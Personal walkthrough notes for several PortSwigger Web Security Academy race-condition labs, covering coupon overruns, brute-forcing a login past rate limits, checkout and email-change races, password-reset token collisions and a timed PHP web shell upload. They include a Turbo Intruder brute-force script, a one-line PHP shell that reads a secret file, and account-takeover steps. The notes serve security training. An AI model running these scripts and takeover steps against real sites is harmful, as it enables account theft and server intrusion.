
# 1 Lab: Limit overrun race conditions

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a **Lightweight L33t Leather Jacket**.

You can log in to your account with the following credentials: `wiener:peter`.

For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the [Trigger race conditions](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/ProbeForRaceCondition.bambda) custom action. This is only available in Burp Suite Professional.

**login and add to carrt jacket and aply cupon** 

![[Pasted image 20250714195729.png]]

**used turbo intuder and send 1 sec 30 request** 


![[Pasted image 20250714200526.png]]


**attack suusesfully worck** 
![[Pasted image 20250714203545.png]]
**web vivew** 
![[Pasted image 20250714203750.png]]

# 2 Lab: Bypassing rate limits via race conditions

## 🗓️ Event Info

- **CTF Platform:** PortSwigger Web Security Academy
    
- **Challenge Type:** Authentication / Brute-force / Web Security
    
- **Tool Used:** Turbo Intruder (in Burp Suite)
    
- **Date:** July 2025
    
- **Target:** `0a3d00dc043e1cb0806235c000640026.web-security-academy.net`
    

---

## 🔍 Challenge Summary

The objective was to **brute-force the login credentials** for the user **"carlos"** on a vulnerable website using **HTTP/2 single-packet login requests**. The challenge aimed to bypass common rate-limiting or CSRF protection mechanisms.

---

## 🧰 Tools & Methods

- **Turbo Intruder**: Burp Suite extension used for high-speed brute-force via HTTP/2.
    
- **Attack Type**: Synchronized packet flood using `engine.BURP2` and `gate='1'`.
    
- **Wordlist**: Common passwords copied from clipboard.
    
- **Goal**: Detect a different HTTP status code (302 Found) as a success indicator.
    

---

## 💻 Script Used

`def queueRequests(target, wordlists):
    `engine = RequestEngine(endpoint=target.endpoint,
                           `concurrentConnections=1,
                           `engine=Engine.BURP2)

    passwords = wordlists.clipboard

    for password in passwords:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')

`def handleResponse(req, interesting):
    `if req.response.status == 302:
        `table.add(req)
- **Trigger Point**: HTTP 302 redirect used as an indicator of **successful login**.

## 🧪 Result

- Among many `400 Bad Request` or `401 Unauthorized`, the response with **HTTP 302** was captured in Turbo Intruder logs.
    
- This redirect confirms a **successful login for user `carlos`**.
    
- **Valid password found** during the brute-force attempt (visible in Turbo Intruder response panel).

![[Pasted image 20250715235910.png]]

### web vivew
![[Pasted image 20250715235954.png]]


# 3 Lab: Multi-endpoint race conditions

## 📌 Challenge Title

**Predict a Potential Collision**  
PortSwigger Web Security Academy

## 🗓️ Date

July 2025

## 🧠 Category

- Web Exploitation
    
- Race Condition
    
- Logical Exploitation
    

## 🎯 Objective

Exploit a race condition in the checkout logic to purchase an expensive item (Lightweight L33t Leather Jacket) despite insufficient store credit, by leveraging the order flow and session-based cart state.

---

## 🧰 Tools Used

- **Burp Suite (Community/Pro)**
    
- **Repeater**
    
- **Proxy and HTTP History**
    
- **Tab Grouping & Parallel Requests (Turbo Intruder optional)**
    

---

## 📖 Challenge Walkthrough

### 1. **Understand the Checkout Flow**

- Logged in and purchased a **gift card** to gain store credit.
    
- Used Burp’s Proxy to capture the flow:
    
    - `POST /cart` → Adds items to cart
        
    - `POST /cart/checkout` → Submits the order
        

### 2. **Confirm Cart is Session-Based**

- Sent a `GET /cart` request with and without session cookie.
    
    - With session: Shows current cart
        
    - Without session: Empty cart
        
- 💡 _Conclusion:_ Cart is stored server-side, tied to session ID or user ID → **potential for a session-based race condition**
    

---

### 3. **Test Race Window Hypothesis**

- Observed that the checkout (`/cart/checkout`) and add-to-cart (`/cart`) are both processed in a single request-response cycle.
    
- Hypothesized that a **race condition** exists: the server may check available credit before finalizing order, creating a small time window to inject another item.
    

---

### 4. **Benchmark Server Timing**

- Grouped `POST /cart` and `POST /cart/checkout` in Repeater.
    
- Sent them in sequence:
    
    - First request (add-to-cart) consistently took longer.
        
- Added a `GET /` request before both to warm the connection → Confirmed network architecture introduces delay.
    
- 💡 _Conclusion:_ Delay is consistent and can be used strategically in the exploit.
    

---

### 5. **Reproduce Normal Behavior**

- Cleared cart and added **only the Leather Jacket** (`productId=1`) → Checkout failed due to insufficient funds (as expected).
    
- Verified the app is checking credit correctly in single-threaded flow.
    

---

### 6. **Exploit Race Condition**

- Cart reset: Added **another gift card** to have small credit.
    
- Set up two requests:
    
    - `POST /cart` to add **Leather Jacket**
        
    - `POST /cart/checkout` to complete purchase
        
- Sent both **in parallel** using Burp tab group:
    
    - **In one of the attempts**, the checkout succeeded even with insufficient funds!
        
    - Response: `200 OK`
        
    - Cart showed **successful purchase of the jacket**



# 3  Single-endpoint race conditions
Single-endpoint race conditions
## 📌 Challenge Title

**Predict a Potential Collision**  
**Platform**: PortSwigger Web Security Academy

## 🗓️ Date

July 2025

## 🧠 Category

- Race Condition
    
- Business Logic Exploitation
    
- Web Application Security
    

---

## 🎯 Objective

Exploit a **race condition** in the email change feature to force the application to confirm a **target email address** (e.g., `carlos@ginandjuice.shop`) instead of the attacker's own, and gain access to protected resources (e.g., the **admin panel**).

---

## 🧰 Tools Used

- **Burp Suite (Pro/Community)**
    
- **Burp Repeater**
    
- **Exploit Server Email Client**
    

---

## 🔎 Challenge Walkthrough

---

### 🔐 1. Understand the Email Change Flow

- Logged in with attacker credentials.
    
- Attempted to change email to:
    
    
    
    `anything@exploit-<YOUR-ID>.exploit-server.net`
    
- Received a confirmation email containing a **unique tokenized link**.
    
- Clicking the link successfully updated the email address → flow is verified.
    

---

### 🔁 2. Identify Behavior & Inference

- Sent **two different** email change requests in succession:
    
    - `test1@exploit-...`
        
    - `test2@exploit-...`
        
- Only the **second** email’s confirmation link remained valid.
    
- 💡 _Inference:_  
    The application stores **only one pending email address** at a time (last-write-wins), suggesting a **database overwrite race vulnerability**.
    

---

### ⏱️ 3. Benchmark Request Timing

- Sent `POST /my-account/change-email` requests in sequence (grouped in Repeater).
    
- Created **20 tabs**, each with a slightly different email (e.g., `test1@`, `test2@`, ...).
    
- Sent in sequence → received **20 valid confirmation emails**.
    
- Conclusion: In sequential flow, system behaves predictably.
    

---

### ⚔️ 4. Test Parallel Race Condition

- Resent the 20 `change-email` requests in **parallel** using Burp Repeater group.
    
- Observed **mismatched confirmation emails**:
    
    - Body of email sometimes referenced a **different address** than the recipient.
        
- 💡 _Deduction:_  
    A **race condition exists** between:
    
    1. Task initiating email dispatch
        
    2. Retrieval of the pending email from the DB  
        → If overwritten mid-process, email is sent to A but says "confirm B".
        


![[Pasted image 20250716001824.png]]

---

### 🎯 5. Exploit the Vulnerability

- Set up two parallel requests in Burp Repeater:
    
    - **Request 1**:  
        `email=anything@exploit-<YOUR-ID>.exploit-server.net`
        
    - **Request 2**:  
        `email=carlos@ginandjuice.shop`
        
- Sent both **in parallel**.
    


![[Pasted image 20250716002028.png]]

---

### ✅ 6. Successful Outcome

- In email client, received confirmation link addressed to `carlos@ginandjuice.shop`.
    
- Clicked link → **email changed** to `carlos@ginandjuice.shop`.
    
- Logged-in account now showed **admin panel link**.
    
- Accessed `/admin` → Deleted user **Carlos** to solve the lab.
![[Pasted image 20250716001911.png]]







# 5 Lab: Exploiting time-sensitive vulnerabilities

# 🛡️Predictable Password Reset Token

## 🧪 Objective

Exploit a vulnerability in the password reset mechanism of a web application by generating two reset tokens with identical values, allowing account takeover of another user (Carlos).

---

## 🧩 Steps and Observations

### 🔍 Step 1: Study Password Reset Behavior

- Initiated the password reset process for **my own user account**.
    
- Received a reset link via email containing:
    
    `/reset?username=winner&token=xyz`
    
- Observed that each token is **unique per request**, indicating dynamic generation.
    

### 🔁 Step 2: Repeating Requests in Burp

- Sent multiple `POST /forgot-password` requests via **Burp Repeater**.
    
- Observed that each request resulted in a **different token** being emailed.
    

#### Inference:

- The token is either:
    
    - A randomly generated string of fixed length.
        
    - A hash containing dynamic inputs such as timestamps, counters, or RNG state.
        

---

## 🧪 Step 3: Parallel Request Timing

- **Duplicated** the Repeater tab and added both tabs to a **new tab group**.
    
- Sent the two `POST /forgot-password` requests in **parallel**.
    
- Observed:
    
    - The response times differed.
        
    - Tokens were still **different**.

![[Pasted image 20250716234550.png]]


---

## 🔓 Step 4: Bypass Per-Session Locking

- Removed session cookie and sent `GET /forgot-password` to get a **new session cookie** and **CSRF token**.
    
- Replaced the cookie and CSRF token in one POST request.
    
- Sent both `POST /forgot-password` requests in **parallel from different sessions**.
    ![[Pasted image 20250716234010.png]]

**SENCCOND RESQUEST** 

![[Pasted image 20250716234058.png]]




---

## 🎯 Step 5: Confirm Vulnerability and Exploit

- Modified one of the POST requests to:
    
    `{   "username": "carlos" }`
    
- Sent both requests in parallel again.
    
![[Pasted image 20250716234255.png]]
### ✅ Result:

- Only **one confirmation email received** (mine).
    ![[Pasted image 20250716234348.png]]

    
- Changed the URL to:    

    `/reset?username=carlos&token=<shared_token>`
    
- Accessed Carlos's reset page successfully.
    
- Set a new password for **Carlos**.
    ![[Pasted image 20250716234424.png]]
    

---

## 🔐 Step 6: Final Exploit and Lab Completion

- Logged in as **Carlos** using the new password.
    
- Navigated to the **admin panel**.
    
- **Deleted Carlos** to complete the lab.
![[Pasted image 20250716234640.png]]

# 6 Lab: Web shell upload via race condition

# ✅ Exploiting File Upload Race Condition to Execute a PHP Shell**

### 💡 **Lab Objective**

Exploit a **race condition** in a file upload process to execute a malicious PHP file before it is deleted by server-side validation. Use this to retrieve Carlos’s secret from the server.

---

## 🔍 **Source Code Analysis**

`<?php
``$target_dir = "avatars/";
`$target_file = $target_dir . $_FILES["avatar"]["name"];

`// temporary move
`move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

`if (checkViruses($target_file) && checkFileType($target_file)) {
	`echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
`} else {
    ==`unlink($target_file);====`
    `==echo "Sorry, there was an error uploading your file.";====`
    `http_response_code(403==);`
`}

`function checkViruses($fileName) {
  ``  // checking for viruses
    ...
`}

`function checkFileType($fileName) {
    ``$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    `if($imageFileType != "jpg" && $imageFileType != "png") {
        ``echo "Sorry, only JPG & PNG files are allowed\n";
        `return false;
    `}` else {
        `return true;
    }
`}
`?>`

### 🔧 **Vulnerability**

- File is saved to a **publicly accessible location** (`avatars/`) **before** validation occurs.
    
- Malicious files are **only deleted** if they **fail checks after being moved**.
    
- This introduces a **Time-of-Check to Time-of-Use (TOCTOU)** **race condition**:
    
    - **Check** happens _after_ file is available.
        
    - **Execution** can be triggered _before_ validation completes and deletes it.
        
## Used in Your Code

From your earlier upload handler:

`if (checkViruses($target_file) && checkFileType($target_file)) {     echo "The file has been uploaded."; } else {     unlink($target_file); // <- This deletes the file if it fails checks     echo "Sorry, error uploading your file."; }`

### 🧠 What This Does:

- The file is **already saved** (via `move_uploaded_file`).
    
- Then it's **scanned and validated**.
    
- If validation **fails**, `unlink($target_file)` deletes it.

|Condition|Result|
|---|---|
|`checkViruses()` OR `checkFileType()` returns `false`|`unlink($target_file)` is called — file is deleted|
|File deleted?|✅ If `unlink()` returns `true`, file is gone  <br>❌ If `unlink()` fails (e.g., race condition), file may stay briefly|
|`http_response_code(403)`|Server sends **Forbidden** status

---

## 🛠️ **Steps to Exploit**

### ✅ **1. Prepare Your Malicious Payload**

Create a file locally named `shell.php` with this content:

php

CopyEdit

`<?php echo file_get_contents('/home/carlos/secret'); ?>`

---

### ✅ **2. Capture the Avatar Upload Request**

1. Log in as `wiener`.
    
2. Upload any image through the avatar form (just to generate the request).
    
3. In **Burp → Proxy → HTTP history**, find the POST request:
    
    `POST /my-account/avatar`
    
4. Right-click → **Send to Repeater**
    

---

### ✅ **3. Modify the POST Request in Repeater**

Change the file field to use your PHP payload:

![[Pasted image 20250717202313.png]]
**Tip**: You can also name the file `shell.php` or similar to bypass basic filters, depending on the lab behavior.

---

### ✅ **4. Prepare Parallel GET Request**

- In Burp Repeater, open a **second tab**.
    
- Paste this GET request:
![[Pasted image 20250717202429.png]]


---

### ✅ **5. Launch Manual Race Condition**

To win the race manually:

1. **Right-click** both tabs in Repeater → choose **"Group tabs"**.
    
2. Select **both** the POST and GET requests.
3.  Select **both** PATH `GET /files/avatars/`and `POST /my-account/avatar`and 1 more `GET /files/avatars/`

![[Pasted image 20250717202902.png]]
![[Pasted image 20250717202915.png]]
![[Pasted image 20250717202933.png]]

4. Click **"Send group in parallel"** (in Burp Repeater UI).
    
    
---

### ✅ **6. Check GET Response**

- If it works, the **GET response for `/files/avatars/shell.php`** will return **HTTP 200 OK** and contain the secret:
    
    
    `37sl9ab3gFshX...   ← Carlos’s secret`
    
- If not, retry a few more times.
    

---

### ✅ **7. Submit the Secret**

Copy the secret and paste it into the lab solution box.








